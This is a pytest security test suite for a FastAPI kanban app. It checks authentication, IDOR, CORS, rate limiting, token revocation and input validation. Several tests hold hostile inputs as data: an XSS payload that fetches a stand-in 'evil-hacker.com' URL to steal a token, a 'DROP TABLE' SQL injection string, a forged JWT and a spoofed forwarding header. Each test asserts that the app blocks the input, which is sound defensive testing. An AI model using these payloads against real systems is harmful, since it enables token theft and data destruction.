import pytest
from fastapi.testclient import TestClient
from main import app, redis_client
import uuid

client = TestClient(app)


# ==========================================
# FIXTURES (The Setup Robots)
# ==========================================
@pytest.fixture(scope="module")
def user_a():
    return {
        "email": f"alice_{uuid.uuid4().hex[:8]}@orbit.com",
        "password": "password123",
    }


@pytest.fixture(scope="module")
def auth_a(user_a):
    client.post("/users/", json=user_a)
    token = client.post(
        "/login", data={"username": user_a["email"], "password": user_a["password"]}
    ).json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture(scope="module")
def user_b():
    return {
        "email": f"hacker_bob_{uuid.uuid4().hex[:8]}@orbit.com",
        "password": "password123",
    }


@pytest.fixture(scope="module")
def auth_b(user_b):
    client.post("/users/", json=user_b)
    token = client.post(
        "/login", data={"username": user_b["email"], "password": user_b["password"]}
    ).json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


# ==========================================
# 1. SERVER HEALTH
# ==========================================
def test_health_check():
    response = client.get("/")
    assert response.status_code == 200


# ==========================================
# 2. AUTHENTICATION EDGE CASES
# ==========================================
def test_register_duplicate_user():
    temp_user = {
        "email": f"dup_{uuid.uuid4().hex[:8]}@orbit.com",
        "password": "password123",
    }
    client.post("/users/", json=temp_user)
    res = client.post("/users/", json=temp_user)

    assert res.status_code == 400
    assert res.json()["detail"] == "Email already registered"


def test_login_wrong_password(user_a):
    res = client.post(
        "/login", data={"username": user_a["email"], "password": "wrongpassword!"}
    )
    assert res.status_code == 400


def test_login_nonexistent_user():
    res = client.post(
        "/login", data={"username": "ghost@orbit.com", "password": "password123"}
    )
    assert res.status_code == 400


def test_access_with_fake_token():
    # Attempt to bypass the security guard with a fabricated JWT
    res = client.post(
        "/workspaces/",
        json={"name": "Hacker Room"},
        headers={
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature"
        },
    )
    assert res.status_code == 401
    assert res.json()["detail"] == "Could not validate credentials"


def test_access_without_token():
    res = client.post("/workspaces/", json={"name": "Ghost Workspace"})
    assert res.status_code == 401


# ==========================================
# 3. PYDANTIC VALIDATION EDGE CASES
# ==========================================
def test_create_workspace_missing_fields(auth_a):
    # A frontend bug forgets to send the "name" field
    res = client.post("/workspaces/", json={}, headers=auth_a)
    # 422 Unprocessable Entity means Pydantic successfully blocked bad data
    assert res.status_code == 422
    assert res.json()["detail"][0]["msg"] == "Field required"


# ==========================================
# 4. DATA CREATION & RETRIEVAL (The Core Flow)
# ==========================================
def test_create_workspace(auth_a):
    res = client.post("/workspaces/", json={"name": "Alpha Team"}, headers=auth_a)
    assert res.status_code == 200
    assert res.json()["name"] == "Alpha Team"


def test_get_user_workspaces(auth_a, user_a):
    # For this test, we'll just register a quick temporary user to get a clean ID
    temp_user = {"email": f"temp_{uuid.uuid4().hex[:8]}@orbit.com", "password": "temp"}
    temp_id = client.post("/users/", json=temp_user).json()["id"]

    res = client.get(f"/users/{temp_id}/workspaces")
    assert res.status_code == 200
    assert isinstance(res.json(), list)


# ==========================================
# 5. KANBAN LOGIC & 404 HANDLING
# ==========================================
def test_create_and_update_task(auth_a):
    # Setup parent containers
    ws = client.post("/workspaces/", json={"name": "Beta Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/", json={"name": "Proj 1", "workspace_id": ws["id"]}, headers=auth_a
    ).json()

    # Create the task
    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Fix Bug", "priority_level": 1},
        headers=auth_a,
    ).json()
    assert task["status"] == "To Do"

    # Drag and Drop Update
    updated_task = client.put(
        f"/tasks/{task['id']}", json={"status": "In Progress"}, headers=auth_a
    ).json()
    assert updated_task["status"] == "In Progress"


def test_update_nonexistent_task(auth_a):
    res = client.put("/tasks/999999", json={"status": "Done"}, headers=auth_a)
    assert res.status_code in [403, 404]


# ==========================================
# 6. ADVANCED SECURITY & RELATIONAL INTEGRITY
# ==========================================
def test_idor_vulnerability(auth_a, auth_b):
    # 1. Alice creates a private workspace
    ws_alice = client.post(
        "/workspaces/", json={"name": "Alice's Secret Vault"}, headers=auth_a
    ).json()

    # 2. Bob tries to sneak into Alice's workspace to create a project
    res = client.post(
        "/projects/",
        json={"name": "Bob's Malware", "workspace_id": ws_alice["id"]},
        headers=auth_b,
    )

    # This SHOULD be blocked with a 403 Forbidden or 401 Unauthorized
    assert res.status_code in [401, 403, 404]


def test_foreign_key_phantom(auth_a):
    # Attempt to create a task in a project that doesn't exist
    res = client.post(
        "/projects/999999/tasks",
        json={"title": "Ghost Task", "priority_level": 1},
        headers=auth_a,
    )
    # The database should reject this relational mismatch
    assert res.status_code in [403, 404]


def test_pydantic_strict_typing(auth_a):
    ws = client.post(
        "/workspaces/", json={"name": "Type Test Team"}, headers=auth_a
    ).json()
    proj = client.post(
        "/projects/",
        json={"name": "Type Test Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    # Attempt to send a string ("URGENT") to an integer field (priority_level)
    res = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Type Mismatch", "priority_level": "URGENT"},
        headers=auth_a,
    )
    assert res.status_code == 422
    assert res.json()["detail"][0]["type"] == "int_parsing"


# ==========================================
# 7. UNCOVERED EDGE CASES (Data Leaks & State)
# ==========================================
def test_unauthenticated_data_leak():
    # A hacker tries to read the projects of workspace ID 1 without logging in.
    res = client.get("/workspaces/1/projects")
    assert res.status_code == 401


def test_invalid_kanban_state(auth_a):
    ws = client.post("/workspaces/", json={"name": "State Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "State Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()
    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Test State", "priority_level": 1},
        headers=auth_a,
    ).json()

    # Try to move the task to a column that doesn't exist
    res = client.put(
        f"/tasks/{task['id']}", json={"status": "HACKED COLUMN"}, headers=auth_a
    )
    assert res.status_code == 422


# ==========================================
# 8. INFRASTRUCTURE & PAGINATION
# ==========================================
def test_cors_origin_blocking():
    # A malicious website tries to make an OPTIONS preflight request to your API
    headers = {
        "Origin": "http://evil-hacker.com",
        "Access-Control-Request-Method": "POST",
    }
    res = client.options("/login", headers=headers)
    assert res.headers.get("access-control-allow-origin") != "http://evil-hacker.com"


def test_pagination_limits(auth_a):
    ws = client.post(
        "/workspaces/", json={"name": "Pagination Team"}, headers=auth_a
    ).json()
    proj = client.post(
        "/projects/",
        json={"name": "Pagination Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    for i in range(3):
        client.post(
            f"/projects/{proj['id']}/tasks",
            json={"title": f"Task {i}", "priority_level": 1},
            headers=auth_a,
        )

    res = client.get(f"/projects/{proj['id']}/tasks?skip=0&limit=2", headers=auth_a)

    assert res.status_code == 200
    assert len(res.json()) == 2


# ==========================================
# 9. REDIS SECURITY (Rate Limits & Blacklisting)
# ==========================================
def test_rate_limiting_brute_force(user_a):
    # IP Spoofing: Give this test a clean bucket
    spoofed_ip = {"X-Forwarded-For": "192.168.1.100"}
    status_codes = []

    # We blast the server with 8 rapid-fire requests. The limit is 5.
    for i in range(10):
        res = client.post(
            "/login",
            data={"username": user_a["email"], "password": user_a["password"]},
            headers=spoofed_ip,
        )
        status_codes.append(res.status_code)

    assert 200 in status_codes
    assert 429 in status_codes


def test_token_revocation_logout():
    # 1. Wipe the DB to guarantee a perfectly clean state
    redis_client.flushdb()

    # 2. Create isolated user
    temp_user = {
        "email": f"logout_{uuid.uuid4().hex[:8]}@orbit.com",
        "password": "password123",
    }
    client.post("/users/", json=temp_user)

    # 3. Login
    res = client.post(
        "/login",
        data={"username": temp_user["email"], "password": temp_user["password"]},
    )
    token = res.json()["access_token"]
    auth_headers = {"Authorization": f"Bearer {token}"}

    # 4. Explicit logout
    logout_res = client.post("/logout", headers=auth_headers)
    assert (
        logout_res.status_code == 200
    )  # Explicitly ensure the server processed the logout

    # 5. The hacker tries to use the ghost token
    res_after = client.get("/workspaces/1/projects", headers=auth_headers)

    # The system MUST reject the ghost token
    assert res_after.status_code == 401
    assert "revoked" in res_after.json()["detail"]


# ==========================================
# 10. ADVANCED THREATS (OOM, SQLi, XSS)
# ==========================================
def test_payload_exhaustion_attack(auth_a):
    ws = client.post("/workspaces/", json={"name": "OOM Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "OOM Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    # The Hack: Generate a massive 1 Megabyte string
    massive_string = "A" * 1000000

    res = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": massive_string, "priority_level": 1},
        headers=auth_a,
    )

    # Pydantic MUST block this before it hits the server's RAM or database
    assert res.status_code == 422
    assert res.json()["detail"][0]["type"] == "string_too_long"


def test_sql_injection_defense(auth_a):
    ws = client.post("/workspaces/", json={"name": "SQLi Team"}, headers=auth_a).json()

    # The Hack: Attempt to delete the projects table via SQL injection
    sqli_payload = "Proj'; DROP TABLE projects; --"

    proj = client.post(
        "/projects/",
        json={"name": sqli_payload, "workspace_id": ws["id"]},
        headers=auth_a,
    )

    assert proj.status_code == 200
    assert (
        proj.json()["name"] == sqli_payload
    )  # The DB survived and stored the literal text harmlessly


def test_xss_injection_defense(auth_a):
    ws = client.post("/workspaces/", json={"name": "XSS Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "XSS Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    # The Hack: Attempt to inject a malicious script into the Kanban board
    xss_payload = "<script>fetch('http://evil-hacker.com/steal-token')</script>"

    res = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": xss_payload, "priority_level": 1},
        headers=auth_a,
    )

    # Our new Pydantic validator MUST catch and block the HTML brackets
    assert res.status_code == 422
    assert (
        "HTML tags and scripts are strictly forbidden" in res.json()["detail"][0]["msg"]
    )


# ==========================================
# 11. DISTRIBUTED BOTNET DEFENSE (Account Lockout)
# ==========================================
def test_distributed_brute_force_lockout():
    # Setup a target victim
    target_email = f"victim_{uuid.uuid4().hex[:8]}@orbit.com"
    client.post("/users/", json={"email": target_email, "password": "securepassword"})

    # THE PRO QA TRICK: Bypass the IP Rate Limiter completely!
    # Instead of firing 10 real HTTP requests, we directly simulate
    # a botnet having already failed 9 times inside the Redis database.
    redis_client.set(f"failed_attempts:{target_email}", 9)

    # The 10th attempt (The final strike)
    res_locked = client.post(
        "/login", data={"username": target_email, "password": "wrongpassword"}
    )

    # 403 Forbidden proves the Account Lockout worked perfectly!
    assert res_locked.status_code == 403
    assert "Account locked" in res_locked.json()["detail"]
